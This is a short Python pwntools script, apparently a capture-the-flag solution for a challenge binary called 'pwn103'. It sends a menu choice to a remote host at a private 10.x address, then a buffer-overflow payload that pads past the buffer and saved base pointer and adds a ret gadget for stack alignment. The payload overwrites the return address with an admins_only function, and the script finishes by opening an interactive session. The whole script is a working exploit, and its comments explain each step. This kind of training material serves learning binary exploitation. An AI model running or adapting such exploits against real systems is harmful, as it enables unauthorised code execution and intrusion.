#!/usr/bin/env python3

from pwn import *

context.binary=binary=ELF("./pwn103.pwn103")

context.log_level="critical"
#p=process()
p=remote("10.10.114.45",9003)

#get the win() function address 
admins_only=p64(binary.symbols.admins_only)

#To overcome stack alignement we have to put ret gadgets 
ret_address=p64(0x00401377)

#We overwrite the buffer as well as 0x20 bytes until reach rbp and overwrite rip with win() adress
payload=b"A"*0x20 + b"B"*0x8 + ret_address + admins_only

#To choose vulnerable option 
p.sendline(b"3")

p.sendline(payload)

p.interactive()